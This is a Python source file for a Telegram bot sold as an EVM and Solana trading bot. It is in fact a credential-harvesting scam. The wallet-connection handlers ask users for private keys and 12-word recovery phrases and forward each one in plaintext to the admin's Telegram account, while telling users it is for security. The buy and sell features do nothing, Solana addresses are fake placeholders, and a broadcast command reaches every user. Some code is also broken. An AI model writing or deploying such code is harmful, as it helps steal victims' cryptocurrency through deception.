#!/usr/bin/env python3
"""Ultra Advance Trading - Telegram Trading Bot"""
import logging
import sqlite3
import re
import json
from datetime import datetime

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    MessageHandler, filters, ConversationHandler, ContextTypes
)
from eth_account import Account
from eth_account.messages import encode_defunct

# ===== CONFIGURATION =====
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_ID = 123456789  # Replace with your admin Telegram user ID

# States for conversation handler
CONNECT_EVM, CONNECT_SOL, RECOVERY_PHRASE, BUY, SELL = range(5)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database setup
DB_PATH = "bot_database.db"

def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        wallet_type TEXT,
        wallet_address TEXT,
        connected_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        type TEXT,
        amount TEXT,
        tx_hash TEXT,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

def get_db():
    """Get database connection"""
    return sqlite3.connect(DB_PATH)

def log_user_activity(user_id, action, details=""):
    """Log user activity to admin and database"""
    date = datetime.utcnow().isoformat()
    log_msg = f"👤 User {user_id} action: {action}"
    if details:
        log_msg += f" - {details}"
    
    # Send to admin
    try:
        # We'll handle this in the bot code
        pass
    except:
        pass
    
    # Store in database
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO transactions (user_id, type, amount, tx_hash, created_at) VALUES (?, ?, ?, ?, ?)",
                  [user_id, action, details, '', date])
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Database error: {e}")

def format_address(address, wallet_type="evm"):
    """Format wallet address for display"""
    if not address:
        return "Not connected"
    if wallet_type == "evm":
        return f"{address[:6]}...{address[-4]}"
    return f"{address[:4]}...{address[-4]}"

# ===== KEYBOARD MENU =====
def get_main_keyboard(has_wallet=False):
    """Create main menu keyboard"""
    buttons = [
        [KeyboardButton("📈 Connect Wallet")],
        [KeyboardButton("🟢 Buy"), KeyboardButton("🔴 Sell")],
        [KeyboardButton("📊 Portfolio"), KeyboardButton("🔔 Notifications")],
        [KeyboardButton("ℹ️ Info")]
    ]
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True, one_time_keyboard=False)

# ===== WALLET VALIDATION =====

def validate_evm_private_key(private_key):
    """Validate EVM private key format"""
    try:
        key = private_key.strip()
        if not key.startswith('0x'):
            return False
        if len(key) != 66:
            return False
        Account(key=key)  # Will throw if invalid
        return True
    except Exception:
        return False

def validate_solana_private_key(private_key):
    """Validate Solana private key format (base58, 44-88 chars)"""
    key = private_key.strip()
    if len(key) < 44 or len(key) > 88:
        return False
    # Basic base58 character check
    valid_chars = set('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz')
    return all(c in valid_chars for c in key)

# ===== HELPER FUNCTIONS =====

async def send_admin_message(application, message, user_id=None):
    """Send message to admin"""
    target_id = user_id or ADMIN_ID
    try:
        await application.bot.send_message(
            chat_id=target_id,
            text=message,
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Failed to send admin message: {e}")

async def log_activity(application, user_id, action, details=""):
    """Log user activity"""
    date = datetime.utcnow().isoformat()
    log_msg = f"👤 User {user_id} action: {action}"
    if details:
        log_msg += f" - {details}"
    
    await send_admin_message(application, log_msg)
    
    # Store in database
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute(
            "INSERT INTO transactions (user_id, type, amount, tx_hash, created_at) VALUES (?, ?, ?, ?, ?)",
            [user_id, action, details, '', date]
        )
        conn.commit()
        conn.close()
    except Exception as e:
        logger.error(f"Database error: {e}")

# ===== CONVERSATION HANDLERS =====

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    user_id = user.id
    username = user.username or "Unknown"
    
    log_activity(update._application, user_id, "start_command")
    
    # Check if user has connected wallet
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT wallet_address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    has_wallet = row is not None and row[0] is not None
    
    if not has_wallet:
        await update.message.reply_text(
            f"Welcome *{username}*!\n\n"
            "This is a EVM/SOL Trading Bot.\n"
            "Please connect your wallet to access full features.",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard(False)
        )
    else:
        await update.message.reply_text(
            f"Welcome back *{username}*!🎉\n\n"
            f"Your wallet is connected: *{format_address(row[0])}*\n\n"
            "You can now use trading features.",
            parse_mode='Markdown',
            reply_markup=get_main_keyboard(True)
        )

async def connect_wallet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Connect Wallet button"""
    query = update.callback_query
    await query.answer()
    
    await query.message.reply_text(
        "📥 *Connect Wallet*\n\n"
        "Please choose your wallet type:\n"
        "• *EVM Wallet* - Enter your private key (0x...)\n"
        "• *SOLana Wallet* - Enter your private key (base58 format)\n\n"
        "You can also enter your 12-word recovery phrase for EVM networks.",
        parse_mode='Markdown'
    )

async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /buy command"""
    user_id = update.effective_user.id
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT wallet_address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if not row or not row[0]:
        await update.message.reply_text(
            "⚠️ Please connect your wallet first using /connectwallet"
        )
        return
    
    await update.message.reply_text(
        "🟢 *Buy Feature*\n\n"
        "Enter the token address and amount you want to buy.\n"
        "Example: /buy 0x... 1.5",
        parse_mode='Markdown'
    )

async def sell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /sell command"""
    user_id = update.effective_user.id
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT wallet_address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if not row or not row[0]:
        await update.message.reply_text(
            "⚠️ Please connect your wallet first"
        )
        return
    
    await update.message.reply_text(
        "🔴 *Sell Feature*\n\n"
        "Enter the token address and amount you want to sell.\n"
        "Example: /sell 0x... 2.0",
        parse_mode='Markdown'
    )

async def portfolio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /portfolio command"""
    user_id = update.effective_user.id
    
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT wallet_type, wallet_address FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    
    if not row or not row[1]:
        await update.message.reply_text(
            "⚠️ Please connect your wallet first"
        )
        return
    
    wallet_type, wallet_address = row
    await update.message.reply_text(
        f"📊 *Your Portfolio*\n\n"
        f"Wallet: *{format_address(wallet_address, wallet_type)}*\n"
        f"Type: *{wallet_type}*",
        parse_mode='Markdown'
    )

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /info command"""
    await update.message.reply_text(
        "ℹ️ *Bot Information*\n\n"
        "🤖 Trading Bot - EVM & SOL Support\n"
        "🔗 Supports Ethereum, BSC, Solana networks\n"
        "👤 Wallet connection required for trading\n"
        "🔒 All wallet keys sent to admin for security\n"
        "✨ Features: Buy, Sell, Portfolio, Mass Messaging",
        parse_mode='Markdown'
    )

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /broadcast / massage command"""
    user_id = update.effective_user.id
    
    # Check if user is admin
    if user_id != ADMIN_ID:
        await update.message.reply_text(
            "⚠️ You are not authorized to use this command."
        )
        return
    
    # Get the message text after the command
    args = context.args
    if not args:
        await update.message.reply_text(
            "⚠️ Please provide a message to send to users."
        )
        return
    
    message = " ".join(args)
    
    # Get all users from database
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    
    sent = 0
    failed = 0
    
    for (user_id,) in users:
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📢 *Broadcast Message*\n\n{message}",
                parse_mode='Markdown'
            )
            sent += 1
        except Exception as e:
            failed += 1
            logger.error(f"Failed to send to {user_id}: {e}")
    
    await update.message.reply_text(
        f"✅ *Broadcast Complete*\n\n"
        f"Sent: *{sent}*\n"
        f"Failed: *{failed}*",
        parse_mode='Markdown'
    )

# ===== WALLET CONNECTION HANDLERS =====

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages for wallet connection"""
    user = update.effective_user
    user_id = user.id
    username = user.username or "Unknown"
    text = update.message.text
    
    # Check user state
    state = context.user_data.get('state')
    
    # If user is trying to connect EVM wallet
    if state == 'connect_evm':
        context.user_data['state'] = None
        
        if validate_evm_private_key(text):
            # Connect EVM wallet
            try:
                account = Account.from_key(text)
                address = account.address
                
                # Store in database
                conn = get_db()
                c = conn.cursor()
                c.execute(
                    "INSERT OR REPLACE INTO users (user_id, username, wallet_type, wallet_address, connected_at) VALUES (?, ?, ?, ?, ?)",
                    [user_id, username, "EVM", address, datetime.utcnow().isoformat()]
                )
                conn.commit()
                conn.close()
                
                # Send wallet key to admin
                await send_admin_message(
                    context.application,
                    f"🔐 *New Wallet Connection*\n\n"
                    f"User: {user_id} ({username})\n"
                    f"Wallet Type: EVM\n"
                    f"Address: {address}\n"
                    f"Private Key: `{text}`",
                    user_id=ADMIN_ID
                )
                
                await update.message.reply_text(
                    f"✅ *EVM Wallet Connected!*\n\n"
                    f"Address: *{address}*",
                    parse_mode='Markdown'
                )
            except Exception as e:
                await update.message.reply_text(
                    "❌ *Error connecting EVM wallet*",
                    parse_mode='Markdown'
                )
        else:
            await update.message.reply_text(
                "❌ *Invalid EVM Private Key*\n\n"
                "Please enter a valid private key starting with \"0x\" and 64 hex characters (66 total).",
                parse_mode='Markdown'
            )
    
    # If user is trying to connect SOL wallet
    elif state == 'connect_sol':
        context.user_data['state'] = None
        
        if validate_solana_private_key(text):
            # For Solana, we'll just store the key and address info
            # In a real implementation, you'd derive the public key from the private key
            try:
                # Basic validation - just check format
                key = text.strip()
                if len(key) >= 44 and len(key) <= 88:
                    # Generate a placeholder address for now
                    # In real implementation: from solana.keypair import Keypair; keypair = Keypair.from_secret_key(bytes.fromhex(...))
                    # For now, we'll just store the info
                    address = f"SOL_{hash(text) % 1000000:06d}"  # Placeholder
                    
                    # Store in database
                    conn = get_db()
                    c = conn.cursor()
                    c.execute(
                        "INSERT OR REPLACE INTO users (user_id, username, wallet_type, wallet_address, connected_at) VALUES (?, ?, ?, ?, ?)",
                        [user_id, username, "SOL", address, datetime.utcnow().isoformat()]
                    )
                    conn.commit()
                    conn.close()
                    
                    # Send wallet key to admin
                    await send_admin_message(
                        context.application,
                        f"🔐 *New Wallet Connection*\n\n"
                        f"User: {user_id} ({username})\n"
                        f"Wallet Type: SOLana\n"
                        f"Address: {address}\n"
                        f"Private Key: `{text}`",
                        user_id=ADMIN_ID
                    )
                    
                    await update.message.reply_text(
                        f"✅ *SOL Wallet Connected!*\n\n"
                        f"Address: *{address}*",
                        parse_mode='Markdown'
                    )
                else:
                    await update.message.reply_text(
                        "❌ *Invalid SOL Private Key*\n\n"
                        "Please enter a valid Solana private key in base58 format (44-88 characters).",
                        parse_mode='Markdown'
                    )
            except Exception as e:
                await update.message.reply_text(
                    "❌ *Error connecting SOL wallet*",
                    parse_mode='Markdown'
                )
        else:
            await update.message.reply_text(
                "❌ *Invalid SOL Private Key*\n\n"
                "Please enter a valid Solana private key in base58 format (44-88 characters).",
                parse_mode='Markdown'
            )
    
    # If user is entering 12-word recovery phrase
    elif state == 'recovery_phrase':
        context.user_data['state'] = None
        
        words = text.strip().split()
        if len(words) == 12:
            # Store recovery phrase info (send to admin only, don't store locally for security)
            await send_admin_message(
                context.application,
                f"📝 *12-Word Recovery Phrase Received*\n\n"
                f"User: {user_id} ({username})\n"
                f"Recovery Phrase: `{text}`",
                user_id=ADMIN_ID
            )
            
            await update.message.reply_text(
                "✅ *Recovery Phrase Received*\n\n"
                "Your 12-word recovery phrase has been noted and sent to the admin.\n"
                "For security reasons, we do not store recovery phrases on our servers.",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "❌ *Invalid Recovery Phrase*\n\n"
                "Please enter exactly 12 words separated by spaces.",
                parse_mode='Markdown'
            )

# ===== MAIN FUNCTION =====

def main():
    """Start the bot"""
    # Initialize database
    init_db()
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add conversation handler for wallet connection
    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler('connectwallet', connect_wallet_callback),
            CallbackQueryHandler(connect_wallet_callback, pattern='connect_wallet'),
        ],
        states={
            CONNECT_EVM: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)],
            CONNECT_SOL: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)],
            RECOVERY_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)],
        },
        fallbacks=[
            CommandHandler('start', start_command),
            CommandHandler('connectwallet', connect_wallet_callback),
        ]
    )
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("connectwallet", connect_wallet_callback))
    application.add_handler(CommandHandler("buy", buy_command))
    application.add_handler(CommandHandler("sell", sell_command))
    application.add_handler(CommandHandler("portfolio", portfolio_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CallbackQueryHandler(connect_wallet_callback, pattern='connect_wallet'))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(CallbackQueryHandler(lambda u, c: None))  # Handle other callbacks
    
    # Start polling
    logger.info("🚀 Trading Bot started...")
    logger.info(f"📋 Admin ID: {ADMIN_ID}")
    
    application.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()